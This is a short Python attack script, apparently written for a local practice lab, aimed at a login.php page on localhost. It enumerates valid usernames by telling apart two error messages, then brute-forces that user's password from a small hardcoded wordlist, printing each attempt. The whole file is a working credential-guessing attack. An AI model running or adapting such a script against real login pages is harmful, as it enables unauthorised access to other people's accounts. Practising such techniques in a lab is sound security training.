#!/usr/bin/env python3

from time import sleep as delay
import requests
import sys

passwords = ['88&+d', '23i', 'J55on', '75us', '352as','244', '1234']
usernames = ['Jhon','mike', 'heli', 'Js5n', 'hugo', 'Json']

url = "http://127.0.0.1:3737/login.php"

def bruteForce(user):
    print("\n[!] Crakeando password para: ", user)

    for pass_ in passwords:
        print(f"\r[+] {user}:{pass_}",end='')

        data_post = {
            'user': user,
            'pass': pass_
        }

        r = requests.post(url, data=data_post )

        if "Clave incorrecto" not in r.text:
            print(f"\n\n[!] {user}:{pass_}\n")
            sys.exit(0)
        
        delay(1)
        
def userEnum():
    print("\n[!] User enum")

    for user in usernames:
        print(f"\r[+] ", user, end='')

        data_post = {
            'user': user,
            'pass': 'test'
        }

        r = requests.post(url, data=data_post)

        if "Usuario o clave incorrecto" not in r.text:
            print("\n\n[!] user")
            #sys.exit(0)
            return user

        delay(1)

if __name__ == '__main__':
    user = userEnum()
    bruteForce(user)
